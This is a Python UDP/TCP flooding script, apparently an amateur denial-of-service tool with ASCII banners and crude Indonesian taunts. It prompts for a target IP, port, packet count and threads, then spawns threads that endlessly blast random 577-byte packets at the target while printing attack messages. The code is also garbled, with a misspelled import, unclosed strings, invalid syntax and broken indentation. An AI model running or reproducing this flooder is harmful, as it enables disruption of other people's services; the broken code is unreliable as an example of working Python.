#Anjing Lu Kontol
import random

import socket 

import threanding

import os 

import sys 

import struct

import time 

import codecs

os.system("clear")

print("""\033[93m
\033[93m
  _______  ____ ___    _    _  __  _  ____        __ __     ___
/ | | | | | | | | | | | | | | | | | | | | | | | | | | | | 
/ \---/\---/\---/\---/\---/\---/\---/\---/
/____\/____\/____\/____\/____\/____\/____
/ \_/\_/\_/\_/\_/\_/\_/\_/\_/\_/ 
/ ____\/____\/____\/____\/____\/____\/____                                                               
/ | | | | | | | | | | | | | | | | | | | | | | | | | | | |
_______  ____ ___    _    _  __  _  ____        __ __     ___

 print("\033[95m LU NGAPAIN BANG? \033[95m") 
 ip = str(input(" \033[91mHost/IP NYA:")) 
 port = int(input(" \033[93mPORT NYA:")) 
 choice = str(input(" \033[94m(Y/N):")) 
 times = int(input(" \033[92mPACKET NYA :")) 
 threads = int(input(" \033[96mTHREADS NYA:"))
 
 os.system("clear") 
 
def type (s):
              sys.stdout.write( c )
              
              sys.stdout.flush(  )
              
              time.sleep 0.05
              

type(""
/033[93m
───▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄───  
───█▒▒░░░░░░░░░▒▒█─── 
────█░░█░░░░░█░░█────  
─▄▄──█░░░▀█▀░░░█──▄▄─  
█░░█─▀▄░░░░░░░▄▀─█░░█
█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
█░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
█░░║║║╠─║─║─║║║║║╠─░░█
█░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
""")

 def run(): 
         data = random._urandom(577) 
         i = random.choice(("[*]","[!]","[#]")) 
         while True: 
                 try: 
                         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
                         addr = (str(ip),int(port)) 
                         for x in range(times): 
                                 s.sendto(data,addr) 
                         print(i +" LAH LAH LAH") 
                 except: 
                         print("[!] \033[95mMAMPUS \033[94mKONTOL\033[91mDOWN!!") 
  
 def run2(): 
         data = random._urandom(577) 
         i = random.choice(("[2]","[1]","[3]")) 
         while True: 
                 try: 
                         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
                         s.connect((ip,port)) 
                         s.send(data) 
                         for x in range(times): 
                                 s.send(data) 
                         print(i +" \033[92mDERZ  \033[91mATTACK 
                 except: 
                         s.close() 
                         print("\033[92m] EROR \033[93m] KONTOL") 
  
 for y in range(threads): 
         if choice == 'y': 
                 th = threading.Thread(target = run) 
                 th.start() 
 else: 
                 th = threading.Thread(target = run2) 
                 th.start()